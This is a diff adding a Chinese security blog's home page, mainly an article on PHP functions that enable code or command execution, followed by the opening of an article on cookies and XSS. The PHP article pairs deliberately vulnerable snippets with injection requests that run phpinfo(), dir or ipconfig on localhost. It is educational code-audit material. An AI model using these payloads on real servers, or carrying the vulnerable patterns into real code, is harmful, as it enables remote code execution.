@@ -1,0 +1,1228 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
+    <meta name="description" content="蓝骨, langu.xyz">
+    <meta name="author" content="langu_xyz">
+    
+        <title>
+            
+                        langu_xyz
+        </title>
+        
+<link rel="stylesheet" href="/css/style.css">
+
+            <link rel="shortcut icon" href="/images/logo.jpeg">
+                
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+                    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+                    <script>
+                        var _hmt = _hmt || [];
+                        (function() {
+                          var hm = document.createElement("script");
+                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
+                          var s = document.getElementsByTagName("script")[0]; 
+                          s.parentNode.insertBefore(hm, s);
+                        })();
+                        </script>
+                        
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
+</head>
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                    <a class="logo-title" href="/">
+                        langu_xyz
+                    </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class="active" href="/" >
+                                HOME
+                            </a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="" href="/tags/THINK/" >
+                                THINK
+                            </a>
+                        </li>
+                        
+                            
+                                <li class="menu-item search search-popup-trigger">
+                                    <i class="fas fa-search"></i>
+                                </li>
+                                
+                                
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                    
+                        <div class="icon-item menu-bar">
+                            <div class="menu-bar-middle"></div>
+                        </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="active" href="/" >
+                        HOME
+                    </a>
+                </li>
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/tags/THINK/" >
+                        THINK
+                    </a>
+                </li>
+                
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="home-content-container fade-in-down-animation">
+    <ul class="home-article-list">
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/PHP%E4%B8%AD%E5%AE%B9%E6%98%93%E4%BA%A7%E7%94%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%82%A3%E4%BA%9B%E5%87%BD%E6%95%B0/">
+                        PHP中容易产生命令执行漏洞的那些函数
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        一 代码执行函数PHP中可以执行代码的函数。如eval()、assert()、``、system()、exec()、shell_exec()、passthru()、 escapeshellcmd()、pcntl_exec() 等
+demo 
+123&lt;?phpecho `dir`;?&gt;
+
+
+
+二 文件包含代码注射文件包含函数在特定条件下的代码注射，如include()、include_once()、 require()、require_once()。
+当allow_url_include=On ，PHP Version&gt;=5.2.0 时，导致代码注射。
+demo 
+123&lt;?phpinclude($_GET[&#x27;a&#x27;]);?&gt;
+
+访问http://127.0.0.1/include.php?a=data:text/plain,%3C?php%20phpinfo%28%29;?%3E 即执行phpinfo()
+三 正则匹配代码注射众所周知的preg_replace()函数导致的代码注射。当pattern中存在/e模式修饰符，即允许执行代码。这里我们分三种情况讨论下
+3.1 preg_replace() pattern 参数注射pattern即第一个参数的代码注射。当magic_quotes_gpc=Off时，导致代码执行。
+demo
+12345&lt;?phpecho $regexp = $_GET[&#x27;reg&#x27;];$var = &#x27;&lt;php&gt;phpinfo()&lt;/php&gt;&#x27;;preg_replace(&quot;/&lt;php&gt;(.*?)$regexp&quot;, &#x27;\\1&#x27;, $var);?&gt;
+访问http://127.0.0.1/preg_replace1.php?reg=%3C\/php%3E/e 即执行phpinfo()
+3.2 preg_replace() replacement参数注射replacement即第二个参数的代码注射，导致代码执行。
+demo 
+123&lt;?preg_replace(&quot;/test/e&quot;,$_GET[&#x27;h&#x27;],&quot;jutst test&quot;);?&gt;
+当我们提交 http://127.0.0.1/preg_replace2.php?h=phpinfo() 即执行phpinfo()。
+3.3 preg_replace()第三个参数注射我们通过构造subject参数执行代码。提交：http://127.0.0.1/preg_replace3.php?h=[php]phpinfo()[/php]
+或者 http://127.0.0.1/preg_replace3.php?h=[php]$&#123;phpinfo%28%29&#125;[/php] 导致代码执行
+demo
+123&lt;?preg_replace(&quot;/\s*\[php\](.+?)\[\/php\]\s*/ies&quot;, &quot;\\1&quot;, $_GET[&#x27;h&#x27;]);?&gt;
+四 动态代码执行4.1 动态变量代码执行demo
+12345&lt;?php$dyn_func = $_GET[&#x27;dyn_func&#x27;];$argument = $_GET[&#x27;argument&#x27;];$dyn_func($argument);?&gt;
+我们提交 http://127.0.0.1/dyn_func.php?dyn_func=system&amp;argument=ipconfig 执行ipconfig命令
+4.2 动态函数代码执行demo
+1234567&lt;pre lang=&quot;php&quot; file=&quot;demo42.php&quot; colla=&quot;+&quot;&gt;&lt;?php$foobar = $_GET[&#x27;foobar&#x27;];$dyn_func = create_function(&#x27;$foobar&#x27;, &quot;echo $foobar;&quot;);$dyn_func(&#x27;&#x27;);?&gt;
+我们提交 http://127.0.0.1/create_function.php?foobar=system%28dir%29 执行dir命令
+五 其他5.1 ob_start()函数的代码执行demo code 5.1:
+1234567&lt;pre lang=&quot;php&quot; file=&quot;demo51.php&quot; colla=&quot;+&quot;&gt;&lt;?php$foobar = &#x27;system&#x27;;ob_start($foobar);echo &#x27;dir&#x27;;ob_end_flush();?&gt;
+5.2 array_map()函数的代码执行demo 
+1234567&lt;pre lang=&quot;php&quot; file=&quot;demo52.php&quot; colla=&quot;+&quot;&gt;&lt;?php$evil_callback = $_GET[&#x27;callback&#x27;];$some_array = array(0, 1, 2, 3);$new_array = array_map($evil_callback, $some_array);?&gt;&lt;/pre&gt;
+我们提交 http://127.0.0.1/array_map.php?callback=phpinfo 即执行phpinfo()
+5.3 unserialize()与eval()unserialize（）是PHP中使用率非常高的函数。不正当使用unserialize（）容易导致安全隐患。
+demo
+1234567891011&lt;pre lang=&quot;php&quot; file=&quot;demo53.php&quot; colla=&quot;+&quot;&gt;&lt;?phpclass Example &#123;var $var = &#x27;&#x27;;function __destruct() &#123;eval($this-&gt;var);&#125;&#125;unserialize($_GET[&#x27;saved_code&#x27;]);?&gt;&lt;/pre&gt;
+我们提交 http://127.0.0.1/unserialize.php?saved_code=O:7:%22Example%22:1:&#123;s:3:%22var%22;s:10:%22phpinfo%28%29;%22;&#125; 即执行phpinfo()
+5.4 容易导致安全问题的函数同类型函数还有很多
+12345678910111213141516171819202122array_map()usort(), uasort(), uksort()array_filter()array_reduce()array_diff_uassoc(), array_diff_ukey()array_udiff(), array_udiff_assoc(), array_udiff_uassoc()array_intersect_assoc(), array_intersect_uassoc()array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()array_walk(), array_walk_recursive()xml_set_character_data_handler()xml_set_default_handler()xml_set_element_handler()xml_set_end_namespace_decl_handler()xml_set_external_entity_ref_handler()xml_set_notation_decl_handler()xml_set_processing_instruction_handler()xml_set_start_namespace_decl_handler()xml_set_unparsed_entity_decl_handler()stream_filter_register()set_error_handler()register_shutdown_function()register_tick_function()
+
+
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h3 id="一-代码执行函数"><a href="#一-代码执行函数" class="headerlink" title="一 代码执行函数"></a>一 代码执行函数</h3><p>PHP中可以执行代码的函数。如<code>eval()、assert()、``、system()、exec()、shell_exec()、passthru()、 escapeshellcmd()、pcntl_exec() </code>等</p>
+<p>demo </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo `dir`;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="二-文件包含代码注射"><a href="#二-文件包含代码注射" class="headerlink" title="二 文件包含代码注射"></a>二 文件包含代码注射</h3><p>文件包含函数在特定条件下的代码注射，如<code>include()、include_once()、 require()、require_once()</code>。</p>
+<p>当<code>allow_url_include=On</code> ，<code>PHP Version&gt;=5.2.0</code> 时，导致代码注射。</p>
+<p>demo </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include($_GET[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://127.0.0.1/include.php?a=data:text/plain,%3C?php%20phpinfo%28%29;?%3E </code>即<br>执行<code>phpinfo()</code></p>
+<h3 id="三-正则匹配代码注射"><a href="#三-正则匹配代码注射" class="headerlink" title="三 正则匹配代码注射"></a>三 正则匹配代码注射</h3><p>众所周知的<code>preg_replace()</code>函数导致的代码注射。当<code>pattern</code>中存在/e模式修饰符，即允许执行代码。这里我们分三种情况讨论下</p>
+<h4 id="3-1-preg-replace-pattern-参数注射"><a href="#3-1-preg-replace-pattern-参数注射" class="headerlink" title="3.1 preg_replace() pattern 参数注射"></a>3.1 <code>preg_replace() pattern</code> 参数注射</h4><p>pattern即第一个参数的代码注射。<br>当<code>magic_quotes_gpc=Off</code>时，导致代码执行。</p>
+<p>demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo $regexp = $_GET[&#x27;reg&#x27;];</span><br><span class="line">$var = &#x27;&lt;php&gt;phpinfo()&lt;/php&gt;&#x27;;</span><br><span class="line">preg_replace(&quot;/&lt;php&gt;(.*?)$regexp&quot;, &#x27;\\1&#x27;, $var);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://127.0.0.1/preg_replace1.php?reg=%3C\/php%3E/e</code> 即<br>执行<code>phpinfo()</code></p>
+<h4 id="3-2-preg-replace-replacement参数注射"><a href="#3-2-preg-replace-replacement参数注射" class="headerlink" title="3.2 preg_replace() replacement参数注射"></a>3.2 <code>preg_replace() replacement</code>参数注射</h4><p>replacement即第二个参数的代码注射，导致代码执行。</p>
+<p>demo </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">preg_replace(&quot;/test/e&quot;,$_GET[&#x27;h&#x27;],&quot;jutst test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>当我们提交 <a class="link" target="_blank" rel="noopener" href="http://127.0.0.1/preg_replace2.php?h=phpinfo()">http://127.0.0.1/preg_replace2.php?h=phpinfo()<i class="fas fa-external-link-alt"></i></a> 即<br>执行phpinfo()。</p>
+<h4 id="3-3-preg-replace-第三个参数注射"><a href="#3-3-preg-replace-第三个参数注射" class="headerlink" title="3.3 preg_replace()第三个参数注射"></a>3.3 <code>preg_replace()</code>第三个参数注射</h4><p>我们通过构造subject参数执行代码。提交：<code>http://127.0.0.1/preg_replace3.php?h=[php]phpinfo()[/php]</code></p>
+<p>或者 <code>http://127.0.0.1/preg_replace3.php?h=[php]$&#123;phpinfo%28%29&#125;[/php]</code> 导致代码执行</p>
+<p>demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">preg_replace(&quot;/\s*\[php\](.+?)\[\/php\]\s*/ies&quot;, &quot;\\1&quot;, $_GET[&#x27;h&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="四-动态代码执行"><a href="#四-动态代码执行" class="headerlink" title="四 动态代码执行"></a>四 动态代码执行</h3><h4 id="4-1-动态变量代码执行"><a href="#4-1-动态变量代码执行" class="headerlink" title="4.1 动态变量代码执行"></a>4.1 动态变量代码执行</h4><p>demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dyn_func = $_GET[&#x27;dyn_func&#x27;];</span><br><span class="line">$argument = $_GET[&#x27;argument&#x27;];</span><br><span class="line">$dyn_func($argument);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>我们提交 <code>http://127.0.0.1/dyn_func.php?dyn_func=system&amp;argument=ipconfig</code> 执行ipconfig命令</p>
+<h4 id="4-2-动态函数代码执行"><a href="#4-2-动态函数代码执行" class="headerlink" title="4.2 动态函数代码执行"></a>4.2 动态函数代码执行</h4><p>demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre lang=&quot;php&quot; file=&quot;demo42.php&quot; colla=&quot;+&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$foobar = $_GET[&#x27;foobar&#x27;];</span><br><span class="line">$dyn_func = create_function(&#x27;$foobar&#x27;, &quot;echo $foobar;&quot;);</span><br><span class="line">$dyn_func(&#x27;&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们提交 <code>http://127.0.0.1/create_function.php?foobar=system%28dir%29</code> 执行dir命令</p>
+<h3 id="五-其他"><a href="#五-其他" class="headerlink" title="五 其他"></a>五 其他</h3><h4 id="5-1-ob-start-函数的代码执行"><a href="#5-1-ob-start-函数的代码执行" class="headerlink" title="5.1 ob_start()函数的代码执行"></a>5.1 ob_start()函数的代码执行</h4><p>demo code 5.1:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre lang=&quot;php&quot; file=&quot;demo51.php&quot; colla=&quot;+&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$foobar = &#x27;system&#x27;;</span><br><span class="line">ob_start($foobar);</span><br><span class="line">echo &#x27;dir&#x27;;</span><br><span class="line">ob_end_flush();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="5-2-array-map-函数的代码执行"><a href="#5-2-array-map-函数的代码执行" class="headerlink" title="5.2 array_map()函数的代码执行"></a>5.2 <code>array_map()</code>函数的代码执行</h4><p>demo </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre lang=&quot;php&quot; file=&quot;demo52.php&quot; colla=&quot;+&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$evil_callback = $_GET[&#x27;callback&#x27;];</span><br><span class="line">$some_array = array(0, 1, 2, 3);</span><br><span class="line">$new_array = array_map($evil_callback, $some_array);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<p>我们提交 <code>http://127.0.0.1/array_map.php?callback=phpinfo</code> 即执行<code>phpinfo()</code></p>
+<h4 id="5-3-unserialize-与eval"><a href="#5-3-unserialize-与eval" class="headerlink" title="5.3 unserialize()与eval()"></a>5.3 <code>unserialize()</code>与<code>eval()</code></h4><p><code>unserialize（）</code>是PHP中使用率非常高的函数。不正当使用<code>unserialize（）</code>容易导致安全隐患。</p>
+<p>demo</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;pre lang=&quot;php&quot; file=&quot;demo53.php&quot; colla=&quot;+&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">class Example &#123;</span><br><span class="line">var $var = &#x27;&#x27;;</span><br><span class="line">function __destruct() &#123;</span><br><span class="line">eval($this-&gt;var);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&#x27;saved_code&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
+<p>我们提交 <code>http://127.0.0.1/unserialize.php?saved_code=O:7:%22Example%22:1:&#123;s:3:%22var%22;s:10:%22phpinfo%28%29;%22;&#125;</code> 即执行<code>phpinfo()</code></p>
+<h4 id="5-4-容易导致安全问题的函数"><a href="#5-4-容易导致安全问题的函数" class="headerlink" title="5.4 容易导致安全问题的函数"></a>5.4 容易导致安全问题的函数</h4><p>同类型函数还有很多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">array_map()</span><br><span class="line">usort(), uasort(), uksort()</span><br><span class="line">array_filter()</span><br><span class="line">array_reduce()</span><br><span class="line">array_diff_uassoc(), array_diff_ukey()</span><br><span class="line">array_udiff(), array_udiff_assoc(), array_udiff_uassoc()</span><br><span class="line">array_intersect_assoc(), array_intersect_uassoc()</span><br><span class="line">array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()</span><br><span class="line">array_walk(), array_walk_recursive()</span><br><span class="line">xml_set_character_data_handler()</span><br><span class="line">xml_set_default_handler()</span><br><span class="line">xml_set_element_handler()</span><br><span class="line">xml_set_end_namespace_decl_handler()</span><br><span class="line">xml_set_external_entity_ref_handler()</span><br><span class="line">xml_set_notation_decl_handler()</span><br><span class="line">xml_set_processing_instruction_handler()</span><br><span class="line">xml_set_start_namespace_decl_handler()</span><br><span class="line">xml_set_unparsed_entity_decl_handler()</span><br><span class="line">stream_filter_register()</span><br><span class="line">set_error_handler()</span><br><span class="line">register_shutdown_function()</span><br><span class="line">register_tick_function()</span><br></pre></td></tr></table></figure>
+
+
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Mon Oct 10 2016 21:00:00 GMT+0800">2016-10-10</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/">安全技术</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/PHP/">PHP</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/PHP%E4%B8%AD%E5%AE%B9%E6%98%93%E4%BA%A7%E7%94%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%82%A3%E4%BA%9B%E5%87%BD%E6%95%B0/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/XSS%E5%88%A9%E7%94%A8%E4%B9%8BCookie%20/">
+                        XSS利用之Cookie
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        0x01 什么是cookiecookie是浏览器提供的一种机制，它将document对象的cookie属性提供给JavaScript。可以由JavaScript对其进行控制，而并不是JavaScript本身的性质。
+cookie是存于用户硬盘的一个文件，这个文件通常对应于一个域名，当浏览器再次访问这个域名时，便使这个cookie可用。因此，cookie可以跨越一个域名下的多个网页，但不能跨越多个域名使用。不同的浏览器对cookie的实现也不一样，但其性质是相同的。cookie机制将信息存储于用户硬盘，因此可以作为全局变量，这是它最大的一个优点。它可以用于以下几种场合：
+
+保存用户登录状态。例如将用户id存储于一个cookie内，这样当用户下次访问该页面时就不需要重新登录了，现在很多论坛和社区都提供这样的功能。cookie还可以设置过期时间，当超过时间期限后，cookie就会自动消失。因此，系统往往可以提示用户保持登录状态的时间：常见选项有一个月、三个月、一年等。
+跟踪用户行为。例如一个天气预报网站，能够根据用户选择的地区显示当地的天气情况。如果每次都需要选择所在地是烦琐的，当利用了cookie后就会显得很人性化了，系统能够记住上一次访问的地区，当下次再打开该页面时，它就会自动显示上次用户所在地区的天气情况。因为一切都是在后台完成，所以这样的页面就像为某个用户所定制的一样，使用起来非常方便。
+定制页面。如果网站提供了换肤或更换布局的功能，那么可以使用cookie来记录用户的选项，例如：背景色、分辨率等。当用户下次访问时，仍然可以保存上一次访问的界面风格。
+创建购物车。正如在前面的例子中使用cookie来记录用户需要购买的商品一样，在结账的时候可以统一提交。例如淘宝网就使用cookie记录了用户曾经浏览过的商品，方便随时进行比较。
+
+当然，上述应用仅仅是cookie能完成的部分应用，还有更多的功能需要全局变量。cookie的缺点主要集中于安全性和隐私保护.主要包括以下几种：
+
+cookie可能被禁用。当用户非常注重个人隐私保护时，他很可能禁用浏览器的cookie功能；
+cookie是与浏览器相关的。这意味着即使访问的是同一个页面，不同浏览器之间所保存的cookie也是不能互相访问的；
+cookie可能被删除。因为每个cookie都是硬盘上的一个文件，因此很有可能被用户删除；
+cookie安全性不够高。所有的cookie都是以纯文本的形式记录于文件中，因此如果要保存用户名密码等信息时，最好事先经过加密处理。0x02 设置cookie
+
+每个cookie都是一个名/值对，可以把下面这样一个字符串赋值给document.cookie：document.cookie=&quot;userId=828&quot;;如果要一次存储多个名/值对，可以使用分号加空格（; ）隔开，例如：document.cookie=&quot;userId=828; userName=hulk&quot;;在cookie的名或值中不能使用分号（;）、逗号（,）、等号（=）以及空格。在cookie的名中做到这点很容易，但要保存的值是不确定的。如何来存储这些值呢？方法是用escape()函数进行编码，它能将一些特殊符号使用十六进制表示，例如空格将会编码为“20%”，从而可以存储于cookie值中，而且使用此种方案还可以避免中文乱码的出现。例如：document.cookie=&quot;str=&quot;+escape(&quot;I love ajax&quot;);相当于：document.cookie=&quot;str=I%20love%20ajax&quot;;当使用escape()编码后，在取出值以后需要使用unescape()进行解码才能得到原来的cookie值。尽管document.cookie看上去就像一个属性，可以赋不同的值。但它和一般的属性不一样，改变它的赋值并不意味着丢失原来的值，例如连续执行下面两条语句：document.cookie=&quot;userId=828&quot;;document.cookie=&quot;userName=hulk&quot;;这时浏览器将维护两个cookie，分别是userId和userName，因此给document.cookie赋值更像执行类似这样的语句：document.addcookie(&quot;userId=828&quot;);document.addcookie(&quot;userName=hulk&quot;);事实上，浏览器就是按照这样的方式来设置cookie的，如果要改变一个cookie的值，只需重新赋值，例如：document.cookie=&quot;userId=929&quot;;这样就将名为userId的cookie值设置为了929。
+0x03 获取cookie的值下面介绍如何获取cookie的值。cookie的值可以由document.cookie直接获得：var strcookie=document.cookie;这将获得以分号隔开的多个名/值对所组成的字符串，这些名/值对包括了该域名下的所有cookie。例如：
+12345678&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--document.cookie=&quot;userId=828&quot;;document.cookie=&quot;userName=hulk&quot;;var strcookie=document.cookie;alert(strcookie);//--&gt;&lt;/script&gt;
+
+只能够一次获取所有的cookie值，而不能指定cookie名称来获得指定的值，这正是处理cookie值最麻烦的一部分。用户必须自己分析这个字符串，来获取指定的cookie值，例如，要获取userId的值，可以这样实现：
+12345678910111213141516171819202122&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--//设置两个cookiedocument.cookie=&quot;userId=828&quot;;document.cookie=&quot;userName=hulk&quot;;//获取cookie字符串var strcookie=document.cookie;//将多cookie切割为多个名/值对var arrcookie=strcookie.split(&quot;; &quot;);var userId;//遍历cookie数组，处理每个cookie对for(var i=0;i&lt;arrcookie.length;i++)&#123;      var arr=arrcookie[i].split(&quot;=&quot;);      //找到名称为userId的cookie，并返回它的值      if(&quot;userId&quot;==arr[0])&#123;             userId=arr[1];             break;      &#125;&#125;alert(userId);//--&gt;&lt;/script&gt;
+
+这样就得到了单个cookie的值
+用类似的方法，可以获取一个或多个cookie的值，其主要的技巧仍然是字符串和数组的相关操作。
+0x04 给cookie设置终止日期到现在为止，所有的cookie都是单会话cookie，即浏览器关闭后这些cookie将会丢失，事实上这些cookie仅仅是存储在内存中，而没有建立相应的硬盘文件。在实际开发中，cookie常常需要长期保存，例如保存用户登录的状态。这可以用下面的选项来实现：document.cookie=&quot;userId=828; expires=GMT_String&quot;;其中GMT_String是以GMT格式表示的时间字符串，这条语句就是将userId这个cookie设置为GMT_String表示的过期时间，超过这个时间，cookie将消失，不可访问。例如：如果要将cookie设置为10天后过期，可以这样实现：
+1234567891011&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--//获取当前时间var date=new Date();var expireDays=10;//将date设置为10天以后的时间date.setTime(date.getTime()+expireDays*24*3600*1000);//将userId和userName两个cookie设置为10天后过期document.cookie=&quot;userId=828; userName=hulk; expire=&quot;+date.toGMTString();//--&gt;&lt;/script&gt;
+0x05 删除cookie为了删除一个cookie，可以将其过期时间设定为一个过去的时间，例如：
+12345678910&lt;script language=&quot;JavaScript&quot; type=&quot;text/JavaScript&quot;&gt;&lt;!--//获取当前时间var date=new Date();//将date设置为过去的时间date.setTime(date.getTime()-10000);//将userId这个cookie删除document.cookie=&quot;userId=828; expire=&quot;+date.toGMTString();//--&gt;&lt;/script&gt;
+0x06 指定可访问cookie的路径默认情况下，如果在某个页面创建了一个cookie，那么该页面所在目录中的其他页面也可以访问该cookie。如果这个目录下还有子目录，则在子目录中也可以访问。例如在www.xxxx.com/html/a.html中所创建的cookie，可以被www.xxxx.com/html/b.html或www.xxx.com/ html/ some/c.html所访问，但不能被www.xxxx.com/d.html访问。为了控制cookie可以访问的目录，需要使用path参数设置cookie，语法如下：document.cookie=&quot;name=value; path=cookieDir&quot;;其中cookieDir表示可访问cookie的目录。例如：document.cookie=&quot;userId=320; path=/shop&quot;;就表示当前cookie仅能在shop目录下使用。如果要使cookie在整个网站下可用，可以将cookie_dir指定为根目录，例如：document.cookie=&quot;userId=320; path=/&quot;;
+0x07 指定可访问cookie的主机名和路径类似，主机名是指同一个域下的不同主机，例如：www.google.com和gmail.google.com就是两个不同的主机名。默认情况下，一个主机中创建的cookie在另一个主机下是不能被访问的，但可以通过domain参数来实现对其的控制，其语法格式为：document.cookie=&quot;name=value; domain=cookieDomain&quot;;以google为例，要实现跨主机访问，可以写为：document.cookie=&quot;name=value;domain=.google.com&quot;;这样，所有google.com下的主机都可以访问该cookie。
+0x08 综合示例：构造通用的cookie处理函数cookie的处理过程比较复杂，并具有一定的相似性。因此可以定义几个函数来完成cookie的通用操作，从而实现代码的复用。下面列出了常用的cookie操作及其函数实现。
+1．添加一个cookie：addcookie(name,value,expireHours)该函数接收3个参数：cookie名称，cookie值，以及在多少小时后过期。这里约定expireHours为0时不设定过期时间，即当浏览器关闭时cookie自动消失。该函数实现如下：
